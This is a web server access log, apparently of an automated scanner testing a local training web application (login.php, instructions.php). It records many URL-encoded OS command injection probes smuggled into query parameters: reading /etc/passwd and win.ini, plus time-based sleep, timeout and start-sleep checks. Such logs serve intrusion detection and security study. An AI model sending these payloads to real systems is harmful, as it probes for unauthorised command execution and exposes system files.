172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%26timeout+%2FT+15 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%26timeout+%2FT+15 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%7Ctimeout+%2FT+15 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%22%26timeout+%2FT+15%26%22 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%22%7Ctimeout+%2FT+15 HTTP/1.1" 200 14324 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%3Bget-help HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%22%3Bget-help HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%27%3Bget-help HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%3Bget-help HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%3Bget-help+%23 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%22%3Bget-help HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%27%3Bget-help HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%3Bget-help+%23 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%3Bstart-sleep+-s+15 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%22%3Bstart-sleep+-s+15 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%3Bstart-sleep+-s+15+%23 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /robots.txt?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "POST /login.php?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /robots.txt?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "POST /login.php?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "POST /login.php?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /robots.txt?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /robots.txt?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "POST /login.php?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /robots.txt?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "POST /login.php?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%26sleep+15%26 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%26sleep+15%26 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%3Bsleep+15%3B HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%3Bsleep+15%3B HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%22%26sleep+15%26%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%22%26sleep+15%26%22 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%26timeout+%2FT+15 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%26timeout+%2FT+15 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%3Bget-help HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%22%3Bget-help HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%3Bget-help HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%27%3Bget-help HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%22%3Bget-help HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%3Bget-help+%23 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%27%3Bget-help HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%3Bget-help+%23 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /robots.txt?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 200 273 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
